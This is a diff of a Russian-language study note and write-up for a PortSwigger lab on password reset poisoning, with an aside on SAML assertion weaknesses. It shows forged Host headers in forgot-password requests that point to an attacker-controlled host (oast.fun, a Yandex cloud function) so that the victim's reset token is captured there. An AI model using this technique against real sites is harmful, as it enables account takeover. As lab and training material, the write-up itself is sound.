@@ -1,17 +1,16 @@
 сперва - доп теория
-
 # Password reset poisoning
 Отравление сброса пароля - это метод, при котором злоумышленник манипулирует уязвимым веб-сайтом, чтобы создать ссылку для сброса пароля, указывающую на домен, находя под его контролем.
 Так можно украсть токен для смены пароля!
 
+само решение лабы начинается НИЖЕ, примерно на 250 строчке
 
-#### исслаедование  Сброс пароля и отравление веб-кэша https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
+-------
+####   Сброс пароля и отравление веб-кэша https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html
 
-смысл схем с отравлением ссылок для восстановления пароля
-если использовать данные открытые из заголовков  запроса на reset пароля
-то можно подделать эти данные!
+------
+* если, делать запросы на восстановление своего пароля и анализировать состав ссылки на сброс пароля!  если ссылка меняется путем изменений параметров которые мы меняем в заголовках, - то это верный признак что можно изменять ссылку сброса, и хакер может подобрать такие параметры чтобы подставить туда свой хост на который прийдет создержание ссылки при переходе по ней!  даже можно было добавлять в заголовки свои доп адресса email на которые тоже приходила такая же ссылка сброса пароля! дублировалась! 
 
-*это можно проследить если, делать запросы на восстановление своего пароля и анализировать состав ссылки на сброс пароля!  если ссылка меняется путем изменений параметров которые мы меняем в заголовках, - то это верный признак что можно изменять ссылку сброса, и хакер может подобрать такие параметры чтобы подставить туда свой хост на который прийдет создержание ссылки при переходе по ней!  даже можно было добавлять в заголовки свои доп адресса email на которые тоже приходила такая же ссылка сброса пароля! дублировалась! 
 ---------------------------------------------------------------------
 1. **Мы экспериментируем с запросом**: меняете заголовки (в первую очередь `Host` и `X-Forwarded-Host`), добавляете или убираете параметры.
     
@@ -193,15 +192,14 @@
         
 
 **Простой пример уязвимого SAML-ответа (упрощённо)**:
-
-xml
-
+```xml
 <saml2:Assertion ID="123" IssueInstant="2024-01-01T10:00:00Z" Version="2.0">
   <!-- Атакующий может подменить это имя -->
   <saml2:Subject><saml2:NameID>attacker</saml2:NameID></saml2:Subject>
   <!-- Если эта подпись не проверяется или проверяется с ошибкой... -->
   <ds:Signature>...подпись...</ds:Signature>
 </saml2:Assertion>
+```
 
 ### 🛡️ Как тестировать безопасность SAML (для пентестера)
 
@@ -220,11 +218,8 @@ xml
 5. **Проверка RelayState**: Проанализируйте параметр `RelayState` на возможность открытого перенаправления (Open Redirect).
     
 
-### 💎 Итог
+> **SAML-документ (Assertion)** — это **цифровой аналог пропуска или визы**, который выдается центральным офисом (IdP) и предъявляется на проходной нужного приложения (SP). Его безопасность целиком зависит от корректной проверки **цифровой подписи** и обработки XML.
 
-**SAML-документ (Assertion)** — это **цифровой аналог пропуска или визы**, который выдается центральным офисом (IdP) и предъявляется на проходной нужного приложения (SP). Его безопасность целиком зависит от корректной проверки **цифровой подписи** и обработки XML.
-
-Для более глубокого понимания рекомендую потренироваться на лабораториях, специально посвящённых уязвимостям SAML (например, в PortSwigger Web Security Academy или PentesterLab).
 
 ----
 
@@ -257,17 +252,20 @@ xml
 https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning
 # Базовое отравление сброса пароля
 
-сказано что юзер карлос будет нажимать на все подряд ссылки что прийдут ему на почтовый ящик
+сказано, что юзер карлос будет нажимать на все подряд 
+ссылки, которые прийдут ему на почтовый ящик
+
 -значит нужно будет отравить ссылку сброса пароля!
 моя учетка = wiener:peter
 
+----
 
 вошел в ак, сбросил пароль, просмотрел все запросы/ответы
-ничего подозрительного нет на первый взгляд
+ничего подозрительного нет, на первый взгляд
 
-логика такая , что когда мы нажимаем на сброс пароля - вводим ник - то на этот ник приходит ссылка с токеном сброса пароля, и потом в запросе по которому сбрасываетс пароль - поставляется этот токен!
+логика такая , что когда мы нажимаем на сброс пароля - вводим ник - то на этот ник приходит ссылка с токеном сброса пароля, и потом в запросе по которому сбрасывается пароль - поставляется этот токен!
 
-[https://0a3f00ca032eb549820dab4b00820037.web-security-academy.net/forgot-password?temp-forgot-password-token=ruz0503msb1lbkcs56s77esfhlie6tg6](https://0a3f00ca032eb549820dab4b00820037.web-security-academy.net/forgot-password?temp-forgot-password-token=ruz0503msb1lbkcs56s77esfhlie6tg6)
+`[https://0a3f00ca032eb549820dab4b00820037.web-security-academy.net/forgot-password?temp-forgot-password-token=ruz0503msb1lbkcs56s77esfhlie6tg6]`
 
 
 попробую менять заголовки чтобы определить что что есть возможность влиять на ссылку сброса!
@@ -285,17 +283,19 @@ https://portswigger.net/web-security/host-header/exploiting/password-reset-poiso
 и ссылка на сброс сформировалась так что туда видимо можно подставить любой сайт!
 
 и у меня как раз есть моя облачная функция которая может быть использована для помены хоста   
-https://functions.yandexcloud.net/d4eehe74dgv6ukpc1q
-
+`https://functions.yandexcloud.net/d4eehe74dgv6ukpc1q
+`
 ------
 
 
 это испорченный запрос смены пароля
+```http
 POST /forgot-password HTTP/2
 Host: s0a3f00ca032eb549820dab4b00820037.web-security-academy.testsssssssssssssssssssssssssssssssssssssssssssssssssss
+```
 
 это ссылка пришла на почту
-https://s0a3f00ca032eb549820dab4b00820037.web-security-academy.testsssssssssssssssssssssssssssssssssssssssssssssssssss/forgot-password?temp-forgot-password-token=mnx4gf6yezpb28lq599uivzaaupiwhif
+`https://s0a3f00ca032eb549820dab4b00820037.web-security-academy.testsssssssssssssssssssssssssssssssssssssssssssssssssss/forgot-password?temp-forgot-password-token=mnx4gf6yezpb28lq599uivzaaupiwhif`
 
 -----
 
@@ -305,30 +305,33 @@ https://s0a3f00ca032eb549820dab4b00820037.web-security-academy.testsssssssssssss
 но можно проще и быстрее!
 # cайт https://app.interactsh.com
 
-дал мне ссылку, она как раз такого же формата как и в оригинальной ссылке!
+дал мне ссылку, она как раз такого же "формата" как и в оригинальной ссылке!
 
 
 новая ссылка на смену ак
-https://0a46003e03a58cd980377b0c003c00d0.web-security-academy.net/forgot-password?temp-forgot-password-token=4o8kw63quf8ymx4pdfj4qs1ddk6j0zjn
+`https://0a46003e03a58cd980377b0c003c00d0.web-security-academy.net/forgot-password?temp-forgot-password-token=4o8kw63quf8ymx4pdfj4qs1ddk6j0zjn`
 
 меняю на  мой сервер!
-https://0a46003e03a58cd980377b0c003c00d0.web-security-academy.net/forgot-password?temp-forgot-password-token=ljtvrbscclacfvhwsnbp9lora8on2p54x.oast.fun
+`https://0a46003e03a58cd980377b0c003c00d0.web-security-academy.net/forgot-password?temp-forgot-password-token=ljtvrbscclacfvhwsnbp9lora8on2p54x.oast.fun`
 
 ориг запрос
+```http
 POST /forgot-password HTTP/2
 Host: 0a46003e03a58cd980377b0c003c00d0.web-security-academy.net
+```
 
 меняю на зараженный!
+```http
 POST /forgot-password HTTP/2
 Host: ljtvrbscclacfvhwsnbp9lora8on2p54x.oast.fun
-
-отправляю сброс своего пароля и вижу что пришла ссылка с моей ссылкой!
+```
+отправляю сброс своего пароля и вижу что пришла ссылка на почтовый ящик с моей ссылкой!
 
 <img src="../../assets/23rfe.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
 
 
 такое жи письмо приходит если и мой сервер подставить 
-functions.yandexcloud.net/d4eehe74dgv6ukpc1q
+functions.yandexcloud.net/d4eehe74dgv6ukpc88
 
 вот подмена хоста
 
@@ -340,7 +343,7 @@ functions.yandexcloud.net/d4eehe74dgv6ukpc1q
 
 <img src="../../assets/khbi978.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
 
-
+-----
 # ВЫВОД
 
 при сбросе пароля ссылка на сброс пароля формировалась через параметр Host в запросе
@@ -354,5 +357,5 @@ functions.yandexcloud.net/d4eehe74dgv6ukpc1q
 
 я подменил токен смены пароля для карлоса и поменял пароль на свой!
 
-==portSwigger блокирует чужие домены и "карлос" не нажимает на такие чужие ссылки, так что проверку работы перехвата возможно только через смену пароля своего аккаунта wiener^ а саму лабу решить через их подставной разрешенный хост==
+==portSwigger блокирует чужие домены и "карлос" не нажимает на такие чужие ссылки, так что проверку работы перехвата возможно только через смену пароля своего аккаунта wiener^ а саму лабу можно решить через их подставной разрешенный хост==
 
